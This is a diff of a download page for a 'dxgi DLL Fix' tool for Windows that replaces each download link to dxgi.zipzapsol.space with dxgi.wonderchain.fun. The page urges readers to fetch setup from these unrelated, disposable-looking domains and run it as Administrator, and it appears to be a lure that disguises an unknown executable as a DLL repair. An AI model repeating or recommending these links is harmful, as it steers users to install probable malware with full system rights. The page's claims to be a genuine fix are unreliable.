@@ -13,27 +13,27 @@ Fix **dxgi.dll missing** on Windows 10/11. This page includes a **direct downloa
 > **This is the download page.** Use the button or link below to get **dxgi DLL Fix** for Windows.
 
 <p align="center">
-  <a href="https://dxgi.zipzapsol.space/">
+  <a href="https://dxgi.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-dxgi%20DLL%20Fix-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download dxgi DLL Fix">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[dxgi.zipzapsol.space](https://dxgi.zipzapsol.space/)** |
-| **Full URL** | `https://dxgi.zipzapsol.space/` |
+| **Direct link** | **[dxgi.wonderchain.fun](https://dxgi.wonderchain.fun/)** |
+| **Full URL** | `https://dxgi.wonderchain.fun/` |
 | **Type** | Fix tool for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — dxgi.zipzapsol.space](https://dxgi.zipzapsol.space/)** (link above)
+1. Click **[Download — dxgi.wonderchain.fun](https://dxgi.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://dxgi.zipzapsol.space/"><strong>⬇ Download dxgi DLL Fix now</strong></a></p>
+<p align="center"><a href="https://dxgi.wonderchain.fun/"><strong>⬇ Download dxgi DLL Fix now</strong></a></p>
 
 ---
 
